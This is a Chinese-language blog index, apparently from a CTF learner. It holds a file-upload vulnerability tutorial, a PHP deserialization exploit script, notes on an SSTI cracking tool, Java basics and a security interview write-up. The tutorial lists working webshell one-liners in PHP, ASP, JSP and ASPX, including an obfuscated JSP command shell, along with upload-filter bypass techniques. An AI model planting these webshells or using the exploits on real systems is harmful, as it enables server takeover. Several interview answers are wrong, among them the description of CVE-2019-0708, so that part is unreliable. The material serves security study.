<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/08/18/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/08/18/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>文件上传，顾名思义，就是web应用程序中允许上传图片、视频和其他类型的文件到服务器中。</p><p>而其在web开发中的应用十分广泛。我们生活中也有许多的例子，比如我们发微信朋友圈、发qq动态和抖音的图片视频上传功能。正是由于广泛的应用，所以难免会有一些过滤疏漏或者中间件版本漏洞，这就造成了一些文件上传的漏洞的生成。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>其最核心的原理就是利用服务器代码对文件上传路径变量过滤不严格将可执行的文件上传到服务器中，再利用其写入的webshell去拿到这个站的权限，达到控制整个网站甚至服务器的效果。</p><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="一、客户端检测"><a href="#一、客户端检测" class="headerlink" title="一、客户端检测"></a>一、客户端检测</h3><p>客户段检测也就是Javascript检测绕过，比较典型的例子就是校验文件上传的后缀名，形式有黑名单也会有白名单。直接点说其实就是前端检测敏感文件，上传发送的数据并没有送到服务器，不涉及后端及服务器的检测。</p><p>一般来说会有两种绕过方法：</p><p>其一是在客户端禁用Javascript代码</p><p>其二就是按照要求正常上传，而后抓取上传的流量包，修改成想要的样子，再进行上传</p><h3 id="二、服务端检测"><a href="#二、服务端检测" class="headerlink" title="二、服务端检测"></a>二、服务端检测</h3><h4 id="1、MINE检测"><a href="#1、MINE检测" class="headerlink" title="1、MINE检测"></a>1、MINE检测</h4><p>mine是描述文件内容的一个参数，判断代码通常为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_FILES[”file“][&quot;type&quot;] ==</span><br></pre></td></tr></table></figure><p>mine具体类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg图片：image/jpeg</span><br><span class="line">png图片：image/png</span><br><span class="line">gif图片：image/gif</span><br><span class="line">mp3：audio/mpeg</span><br><span class="line">zip：application/zip</span><br><span class="line">js：application/x-javascript</span><br></pre></td></tr></table></figure><p>绕过方法也比较简单，就是正常上传，而后抓包修改请求中的Content-Type参数为你想要的值，比如上传一个php代码，抓包修改原来的参数:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type:application/octet-stream</span><br></pre></td></tr></table></figure><p>为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type:image/jpeg</span><br></pre></td></tr></table></figure><h4 id="2、文件扩展名检测"><a href="#2、文件扩展名检测" class="headerlink" title="2、文件扩展名检测"></a>2、文件扩展名检测</h4><p>在服务器会对上传文件的文件类型结尾进行检测，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.php</span><br><span class="line">.js</span><br><span class="line">.asp</span><br></pre></td></tr></table></figure><p>这里绕过方式有很多，比如：</p><p>大小写绕过 、双写绕过、编码绕过(unicode)、0x00绕过、服务器漏洞解析和htaccess文件解析等等</p><h4 id="3、-htaccess文件攻击"><a href="#3、-htaccess文件攻击" class="headerlink" title="3、.htaccess文件攻击"></a>3、.htaccess文件攻击</h4><p>.htaccess文件提供了针对目录改变配置的方法，广泛的说就是htaccess为apache中的一个配置解析文件，通过它可以改变文件的扩展名和解析方式，这也正是我们要利用的攻击方式</p><p>比如，我们在网站根目录下上传一个htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;lsj.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>大致内容就是把文件名为lsj.jpg 的jpg文件当成php文件去解析</p><p>而后我们上传一个图片码就行，图片码制作：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy 1.jpg/b+2.php 3.jpg</span><br></pre></td></tr></table></figure><h3 id="三、解析检测"><a href="#三、解析检测" class="headerlink" title="三、解析检测"></a>三、解析检测</h3><p>这方面主要的是关于中间件的解析漏洞，补充中间件</p><p>中间件：是一类提供系统软件和应用软件之间连接，便于各软件之间沟通的软件。</p><p>看起来有点绕，但是很简单。我个人理解就就类似于一个中介的东西</p><h4 id="1、目录解析"><a href="#1、目录解析" class="headerlink" title="1、目录解析"></a>1、目录解析</h4><p>在某些服务器下，会把.asp和.asp目录下的文件都解析成asp文件</p><p>所以攻击方式也很简单，确认上传的路径到asp下就行，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxx.com/xxx.asp/xxx.jpg</span><br></pre></td></tr></table></figure><h4 id="2、文件解析"><a href="#2、文件解析" class="headerlink" title="2、文件解析"></a>2、文件解析</h4><p>某些服务器不解析 ; 后的内容，因此xxx.asp;jpg会被解析为xxx.asp</p><p>这和%00截断有点相似，00代表结束符，所以会把00后面的所有字符删除。但需要两个前置条件，第一是PHP版本小于5.3.4，第二是PHP的magic_quotes_gpc为OFF状态</p><h4 id="3、apache解析"><a href="#3、apache解析" class="headerlink" title="3、apache解析"></a>3、apache解析</h4><p>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure><p>常用后缀：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*.php *.php3 *.php4 *.php5 *.phtml *.pht</span><br></pre></td></tr></table></figure><h4 id="4、Nginx解析漏洞"><a href="#4、Nginx解析漏洞" class="headerlink" title="4、Nginx解析漏洞"></a>4、Nginx解析漏洞</h4><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置script_filename。</p><p>比如，当访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxx.com/phpinfo.jpg/1.php</span><br></pre></td></tr></table></figure><p>这个url时候，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，php会认为script_filename为phpinfo.jpg，就会将其作为php来解析。<br>练习</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability</span><br></pre></td></tr></table></figure><h3 id="四、条件竞争攻击"><a href="#四、条件竞争攻击" class="headerlink" title="四、条件竞争攻击"></a>四、条件竞争攻击</h3><p>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。</p><p>比如，攻击者先上传一个webshell的脚本a.php，生成另一个名为shell.php 的web</p><p>shell保存在服务器中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">fputs(fopen(&quot;../shell.php&quot;, &quot;w&quot;),&#x27;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>而后立即使用生成的shell.php攻击目标</p><h3 id="五、文件内容检测"><a href="#五、文件内容检测" class="headerlink" title="五、文件内容检测"></a>五、文件内容检测</h3><h4 id="1、文件幻数检测"><a href="#1、文件幻数检测" class="headerlink" title="1、文件幻数检测"></a>1、文件幻数检测</h4><p>文件幻数检测，也就是文件开头检测</p><p>文件的十六进制表示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.jpgFF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif47 49 46 38 39 61</span><br><span class="line">.png89 50 4E 47</span><br></pre></td></tr></table></figure><p>在后加上shell就行</p><h4 id="2、文件相关信息检测"><a href="#2、文件相关信息检测" class="headerlink" title="2、文件相关信息检测"></a>2、文件相关信息检测</h4><p>通常会利用getimagesize()函数去检测文件头</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure><h4 id="3、shell检测"><a href="#3、shell检测" class="headerlink" title="3、shell检测"></a>3、shell检测</h4><p>绕过<code>&lt;?</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过<code>php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><h4 id="4、目录穿越"><a href="#4、目录穿越" class="headerlink" title="4、目录穿越"></a>4、目录穿越</h4><p>上传的文件会被解析为日志不能执行，给出了<code>/uploads/xxx.php</code>路径并且可以查询</p><p>上传文件的时候抓包，修改文件名（filename）为<code>./../../../../flag</code>，上传成功后路径变为<code>/uploads/./../../../../flag</code>即可进行目录穿越</p><h2 id="常用攻击代码"><a href="#常用攻击代码" class="headerlink" title="常用攻击代码"></a>常用攻击代码</h2><p>php一句话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>asp一句话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],”unsafe”);%&gt;</span><br></pre></td></tr></table></figure><p>jsp一句话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure><p>aspx一句话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过&lt;?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language = &#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>绕过<?php ?></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure><p>jsp一句话免杀(ascii)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java初学笔记&amp;520</title>
      <link href="/2023/05/19/STUDY/java%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/05/19/STUDY/java%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>没有标题，简单随笔而已。</p><p>标识符：字母、数字、下划线、不能是关键字、区分大小写</p><p>单个单词小写，多个单词除第一个单词首字母小写，其余均大写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输出：System.out.println();</span><br><span class="line">输入输出：</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">double</span> <span class="variable">x</span>  <span class="operator">=</span>a.nextDouble();</span><br><span class="line">System.out.println(x);</span><br></pre></td></tr></table></figure><p>数组定义</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String x[] = &#123;<span class="string">&quot;nihao&quot;</span>,<span class="string">&quot;shijie&quot;</span>&#125;;</span><br><span class="line">System.out.println(x[<span class="number">0</span>]+<span class="string">&quot;,&quot;</span>+x[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 类名&#123;</span><br><span class="line">类体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类体由两部分构成：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">变量的声明：成员变量、局部变量，在方法中，局部变量覆盖成员变量</span><br><span class="line">方法的定义：</span><br><span class="line"><span class="type">float</span> read&#123;</span><br><span class="line">方法体的内容</span><br><span class="line">&#125;</span><br><span class="line">不需要返回值是，类型必须为<span class="keyword">void</span></span><br><span class="line"></span><br><span class="line">方法：类方法（<span class="keyword">static</span>）与实例方法</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>子类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 子类名 extends 父类名</span><br></pre></td></tr></table></figure><p>final不能有子类 </p><p>彩蛋：<br>这是一串神秘的代码，也许你能发现什么呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--.--..-.-....-/--.....----..--/-.-..-...--..../-.-.-....-..---/-.--.----...--./----..........-/--..--...-.----/-...------.--..-/--..-.-.---.-../-.-..-----..-.-/-...-.----.---.-</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java&amp;520 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化的python提交脚本</title>
      <link href="/2023/04/29/CTF/das_%E5%BA%8F%E5%88%97%E5%8C%96python/"/>
      <url>/2023/04/29/CTF/das_%E5%BA%8F%E5%88%97%E5%8C%96python/</url>
      
        <content type="html"><![CDATA[<h3 id="基于request请求的提交脚本"><a href="#基于request请求的提交脚本" class="headerlink" title="基于request请求的提交脚本"></a>基于request请求的提交脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;flagflagflagflagflagflagflagflagflagflag&quot;</span></span><br><span class="line">payload2 = <span class="string">&#x27;1&quot;;s:4:&quot;pass&quot;;s:6:&quot;123123&quot;;s:3:&quot;vip&quot;;b:1;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">&quot;http://ip:port/pddpdd.php?data&amp;user=&quot;</span> +payload1 +<span class="string">&quot;&amp;pass=&quot;</span> + payload2).text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DAS出题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jinja_ssti自动化脚本</title>
      <link href="/2023/04/29/CTF/jinja_ssti%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/04/29/CTF/jinja_ssti%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="jinja-ssti"><a href="#jinja-ssti" class="headerlink" title="jinja_ssti"></a>jinja_ssti</h1><p>做一道ssti题目的时候无意间发现的jinja类的ssti的测试爆破脚本，挺方便的，类似于sqlmap。</p><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Marven11/Fenjing</span><br></pre></td></tr></table></figure><p>我是部署到kali上的，windows上死活搭建不起不知道为什么。</p><h2 id="运行语句实例与截图"><a href="#运行语句实例与截图" class="headerlink" title="运行语句实例与截图"></a>运行语句实例与截图</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m fenjing crack --url &#x27;http://node3.anna.nssctf.cn:28355/get_flag&#x27; --method POST --inputs name --action get_flag</span><br></pre></td></tr></table></figure><p><img src="https://nssctf.oss-cn-chengdu.aliyuncs.com/img/lsj/202304292330041.png" alt="image-20230429232957947"></p><h2 id="运行参数解释说明"><a href="#运行参数解释说明" class="headerlink" title="运行参数解释说明"></a>运行参数解释说明</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: python -m fenjing scan [OPTIONS]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -u, --url TEXT       需要扫描的URL</span><br><span class="line">  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式</span><br><span class="line">  --interval FLOAT     每次请求的间隔</span><br><span class="line">  --user-agent TEXT    请求时使用的User Agent</span><br><span class="line">  --help               Show this message and exit.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -u, --url TEXT       form所在的URL</span><br><span class="line">  -a, --action TEXT    form的action，默认为当前路径</span><br><span class="line">  -m, --method TEXT    form的提交方式，默认为POST</span><br><span class="line">  -i, --inputs TEXT    form的参数，以逗号分隔</span><br><span class="line">  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式</span><br><span class="line">  --interval FLOAT     每次请求的间隔</span><br><span class="line">  --user-agent TEXT    请求时使用的User Agent</span><br><span class="line">  --help               Show this message and exit.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF jinja_ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023HVV面试</title>
      <link href="/2023/04/29/HVV/2023/"/>
      <url>/2023/04/29/HVV/2023/</url>
      
        <content type="html"><![CDATA[<h2 id="HVV-面经"><a href="#HVV-面经" class="headerlink" title="HVV 面经"></a>HVV 面经</h2><p>前两周参加了一场森烨的面试，这是 第一次面试，就 导致面的太紧张了，但是还是总结一下，以示参考。</p><p>面试的时候面试官都是对着简历发问，所以简历一定要写自己熟悉的东西，再不济也能说上一二。</p><h3 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h3><p>刚开始统一要求自我介绍。</p><p>这里一般是提前写好稿子，简单介绍自己的学校，擅长的方面以及护网经历即可。一定一定要沉着冷静、大方一点。</p><h3 id="Linux-操作"><a href="#Linux-操作" class="headerlink" title="Linux 操作"></a>Linux 操作</h3><p>问：Linux 如何创建计划任务？</p><p>答：使用 corntab 命令。</p><p>问：corntab 的计划任务列表存储在哪里？</p><p>答：位于 &#x2F;etc&#x2F;corntab 目录。</p><p>问：Linux 如何查看端口开放情况？</p><p>答：可以使用 netstat -anp | grep 端口号 命令来查看端口号对应的进程和状态。</p><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><p>这部分忘了，大概也是也写操作指令之类的。</p><p>问：使用过的安全设备。</p><p>答：绿盟 NF、深信服 AF、天融信昆仑系列、深信服 NGAF、科来网络回溯分析系统、360 天擎</p><h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><p>问：status 和 weblogic 的流量如何区分？</p><p>答：请求URL中包含.action或.do, 这是struts2的默认请求后缀。weblogic的默认请求后缀是.jsp或.html；请求中包含struts2的默认参数,如:action,method等。weblogic的请求参数比较随意,没有固定模式；</p><h3 id="前端相关"><a href="#前端相关" class="headerlink" title="前端相关"></a>前端相关</h3><p>问：你知道原型链污染吗？</p><p>答：原型链污染（Prototype Pollution）是一种常见的安全漏洞，它会导致攻击者能够修改一个对象的原型，从而影响到应用程序的其他部分。这个漏洞在JavaScript中比较常见。在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当你试图访问一个对象的属性时，如果这个对象本身没有这个属性，JavaScript会沿着原型链向上查找，直到找到该属性或者到达原型链的顶端为止。攻击者可以通过在输入数据中注入恶意代码，来修改原型链上的对象，从而修改应用程序的行为。例如，攻击者可以将Object.prototype中的某个方法更改为恶意代码，使得应用程序中所有的对象都继承了这个恶意方法。这样，攻击者就可以在应用程序中执行任意代码，甚至获取敏感信息。</p><p>问：如何避免原型链污染？</p><p>答：为了避免原型链污染，开发人员应该始终使用Object.hasOwnProperty()来检查一个对象是否真正拥有某个属性，而不是依赖原型链。此外，开发人员应该对输入数据进行严格的验证和过滤，以防止恶意代码的注入。最后，应该定期更新和升级应用程序的依赖库，以确保使用的库没有原型链污染漏洞。</p><p>问：XSS 可以达到哪些效果？</p><p>答：前端挖矿、模拟登录页、劫持用户口令等。</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>问：include和require的区别？</p><p>答：include 可以在脚本的任何位置进行调用，而 require 必须在脚本的开头进行调用。此外，require引入的模块必定会在运行时引用，而include是按需加载。</p><p>问：知道GPC吗？</p><p>答：是的。GPC是 PHP 中一个已废弃的安全特性，它会自动对 GET、POST、Cookie 数据中的特殊字符（如单引号、双引号、反斜线等）进行转义处理。当 GPC 开启时，可能会影响某些 SQL 注入攻击的执行。但是，绕过 GPC 仍然可以进行 SQL 注入攻击。</p><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>问：假设开启了特殊字符过滤，怎么办？</p><p>答：1. 使用数字类型的数据（避免使用引号）；</p><p>问：sql 如何写 shell？</p><p>答：</p><h3 id="其他杂项"><a href="#其他杂项" class="headerlink" title="其他杂项"></a>其他杂项</h3><p>问：2019-0708这个漏洞，检测到了但无法利用，为什么？</p><p>答：版本不匹配。这个漏洞只影响Exchange 2010 SP3 Update Rollup 12 到 Exchange 2019 CU4之间的版本,如果目标系统的Exchange版本不在这个范围内,无法利用；已经打了补丁。如果目标系统已经应用了Microsoft发布的安全更新,这个漏洞已经被修复,无法利用；防火墙或WAF拦截。如果目标系统启用了防火墙或WAF,并且规则已经更新到可以检测和拦截这个漏洞利用,会无法利用</p><p>问：shiro 550 和 721 版本在反序列化漏洞上的主要区别？</p><p>答：shiro 550 版本只需要一个恶意构造的 rememberMe cookie 即可触发反序列化漏洞；shiro 721 版本需要先登录,设置 rememberMe&#x3D;true,然后发送恶意构造的 rememberMe cookie 才能触发反序列化漏洞。另外，shiro 550 版本反序列化的是 ShiroRememberMeManager 类；shiro 721 版本反序列化的是 ShiroRememberMeManager$RememberMeToken 类。（Shiro-550 是 Apache Shiro 框架中的一个反序列化漏洞，由于 AES 加密的 key 硬编码在源码中，攻击者可以通过泄露密钥来构造恶意的序列化数据，从而实现远程代码执行等攻击）</p><p>问：你知道哪些恶意流量分析工具？</p><p>答：Wireshark Brim TShark</p><p>问：Win10 UAC 如何绕过？</p><p>答：</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>问：知道 Java 反序列化吗？</p><p>答：。。。</p><h3 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h3><p>问：如何防范DDOS？</p><p>答：增加带宽和加强服务器性能。这可以让服务器有更大的流量处理能力,减少被攻击时的影响；使用DDOS防护服务。像Cloudflare、Incapsula、Akamai等服务可以有效防御DDOS攻击,他们可以过滤恶意流量和只让合法流量通过；配置防火墙和路由器。可以设置规则过滤来自某些IP地址或国家&#x2F;地区的流量。也可以设置SYN Flood防护等；监控流量和服务。当发生DDOS攻击时,可以及时发现服务性能下降和大量异常流。</p><p>问：知道SCRF吗？</p><p>答：嗯。这是服务端虚假请求，可以用来access外网获取不到的主机。</p><p>问：假设你发现服务器有异常登录情况，解决问题之后，如何进一步排查隐患？</p><p>答：</p>]]></content>
      
      
      
        <tags>
            
            <tag> 2023hvv </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
